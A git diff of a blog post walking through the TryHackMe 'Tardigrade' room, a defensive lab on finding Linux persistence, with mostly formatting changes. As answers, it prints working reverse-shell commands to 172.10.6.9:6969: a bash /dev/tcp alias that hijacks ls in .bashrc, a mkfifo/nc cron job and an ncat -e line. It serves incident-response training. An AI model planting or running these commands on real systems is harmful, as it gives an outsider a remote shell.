@@ -4,7 +4,7 @@ layout: post
 title: TryHackMe - Tardigrade - Write-Up
 subtitle: Can you find all the basic persistence mechanisms in this Linux endpoint?
 description: A write-up and walkthrough of the TryHackMe room Tardigrade
-image: https://tryhackme-images.s3.amazonaws.com/room-icons/5a8e7a7a02d75283f411004a07e7bfc6.png
+image: /assets/img/uploads/tardigrade.png
 optimized_image: ""
 category: "{{slug}}"
 tags:
@@ -30,7 +30,7 @@ To begin, we'll connect to the compromised server.  We've been given the followi
 
 We've also been told that the **giorgio** account has **root access** to the server -- nice! Though perhaps also nice for our malicious friend...
 
-##### What is the server's OS version?
+**What is the server's OS version?**
 
 Our first question asks us to find the verify the version of operating system installed on the server.
 
@@ -48,7 +48,7 @@ This will give us the distribution-specific information we're looking for.  We c
 
 > Since we're in the giorgio account already, we might as well have a look around.
 
-##### What's the most interesting file you found in giorgio's home directory?
+**What's the most interesting file you found in giorgio's home directory?**
 
 Something's weird in giorgio's home directory.  When we run `ls -la` to take a look, we find a "bad" file:
 
@@ -56,13 +56,13 @@ Something's weird in giorgio's home directory.  When we run `ls -la` to take a l
 
 A name that on the nose can't be anything healthy.  Best not to run it.
 
-**Answer:** .bad_bash
+**Answer:** `.bad_bash`
 
 > In every investigation, it's important to keep a dirty wordlist to keep track of all your findings, no matter how small. It's also a way to prevent going back in circles and starting from scratch again. As such, now's a good time to create one and put the previous answer as an entry so we can go back to it later.
 
 More on this later.
 
-##### Another file that can be found in every user's home directory is the .bashrc file. Can you check if you can find something interesting in giorgio's .bashrc?
+**Another file that can be found in every user's home directory is the .bashrc file. Can you check if you can find something interesting in giorgio's .bashrc?**
 
 Running a `cat` command on .bashrc immediately shows us a concerning alias:
 
@@ -72,11 +72,11 @@ The `ls` command has been assigned an alias that attempts to create a reverse sh
 
 I'd call that interesting.
 
-**Answer:** alias ls='(bash -i >& /dev/tcp/172.10.6.9/6969 0>&1 & disown) 2>/dev/null; ls --color=auto'
+**Answer:** `alias ls='(bash -i >& /dev/tcp/172.10.6.9/6969 0>&1 & disown) 2>/dev/null; ls --color=auto'`
 
 > It seems we've covered the usual bases in giorgio's home directory, so it's time to check the scheduled tasks that he owns.
 
-##### Did you find anything interesting about scheduled tasks?
+**Did you find anything interesting about scheduled tasks?**
 
 To see the scheduled tasks on a Linux system, we can run `crontab -l`:
 
@@ -84,7 +84,7 @@ To see the scheduled tasks on a Linux system, we can run `crontab -l`:
 
 We see one job scheduled, and it's attempting to create a reverse shell to the same address and port as before.
 
-**Answer:** /usr/bin/rm /tmp/f;/usr/bin/mkfifo /tmp/f;/usr/bin/cat /tmp/f\|/bin/sh -i 2>&1\|/usr/bin/nc 172.10.6.9 6969 >/tmp/f
+**Answer:** `/usr/bin/rm /tmp/f;/usr/bin/mkfifo /tmp/f;/usr/bin/cat /tmp/f|/bin/sh -i 2>&1|/usr/bin/nc 172.10.6.9 6969 >/tmp/f`
 
 ### Task 3: Dirty Wordlist Revisited
 
@@ -96,37 +96,37 @@ This part of the room doesn't have us investigate anything, but instead goes int
 
 > Normal user accounts aren't the only place to leave persistence mechanisms. As such, we will then go ahead and investigate the root account. 
 
-##### A few moments after logging on to the root account, you find an error message in your terminal.  What does it say?
+**A few moments after logging on to the root account, you find an error message in your terminal.  What does it say?**
 
 As mentioned, giorgio has root access to the server, so we escalate our privileges with `sudo -s` and receive an odd message:
 
-![Ncat: TIMEOUT.](/assets/img/uploads/sudo-s.png "Ncat: TIMEOUT.")
+![Ncat: TIMEOUT.](/assets/img/uploads/root.png "Ncat: TIMEOUT.")
 
-**Answer:** Ncat: TIMEOUT.
+**Answer:** `Ncat: TIMEOUT.`
 
-##### After moving forward with the error message, a suspicious command appears in the terminal as part of the error message.  What command was displayed?
+**After moving forward with the error message, a suspicious command appears in the terminal as part of the error message.  What command was displayed?**
 
 We press enter to continue and are provided another unexpected result:
 
-![ncat -e /bin/bash 172.10.6.9 6969](/assets/img/uploads/sudo-s-2.png "ncat -e /bin/bash 172.10.6.9 6969")
+![ncat -e /bin/bash 172.10.6.9 6969](/assets/img/uploads/root-2.png "ncat -e /bin/bash 172.10.6.9 6969")
 
 How did that happen? I didn't even do anything -- I just logged as root, and it happened.
 
-**Answer**: ncat -e /bin/bash 172.10.6.9 6969
+**Answer**: `ncat -e /bin/bash 172.10.6.9 6969`
 
 > You might wonder, "how did that happen? I didn't even do anything? I just logged as root, and it happened."
 
 ...yes, quite.
 
-##### Can you find out how the suspicious command has been implemented?
+**Can you find out how the suspicious command has been implemented?**
 
 To figure out this situation, we revisit our friend .bashrc, but for the root account this time
 
-![](/assets/img/uploads/bashrc-root.png)
+![root .bashrc](/assets/img/uploads/bashrc-root.png "root .bashrc")
 
 and we find our culprit: yet another reverse shell.  Our malicious friend sure is persistent.
 
-**Answer:** .bashrc
+**Answer:** `.bashrc`
 
 ### Task 5: Investigating the system
 
@@ -140,7 +140,7 @@ and we find our culprit: yet another reverse shell.  Our malicious friend sure i
 >
 > This specific persistence mechanism is directly tied to *something* (or someone?) already present in fresh Linux installs and may be abused and/or manipulated to fit an adversary's goals. 
 
-##### What's its name? What is the last persistence mechanism?
+**What's its name? What is the last persistence mechanism?**
 
 The above instructions heavily imply that there is something amiss with an account, so let's check out /etc/passwd to see if anything stands out:
 
@@ -164,7 +164,7 @@ Compare this to the entry found on giorgio's computer.  Giorgio's nobody has a b
 >
 > The adversary left a golden nugget of "advise" somewhere.
 
-##### What is the nugget?
+**What is the nugget?**
 
 Logging in to nobody, we visit its "nonexistent" home directory and take a look around with `ls -la`.  Lo and behold, an unusual file name: 
 
@@ -172,7 +172,7 @@ Logging in to nobody, we visit its "nonexistent" home directory and take a look 
 
 Reading the .youfoundme file with `cat` reveals our second and final flag for this room.
 
-**Answer**: \*\*\*{\*\*\*\*\*\*\*\*\*\*\*\*\**}
+**Answer:** \*\*\*{\*\*\*\*\*\*\*\*\*\*\*\*\**}
 
 ## EOF
 
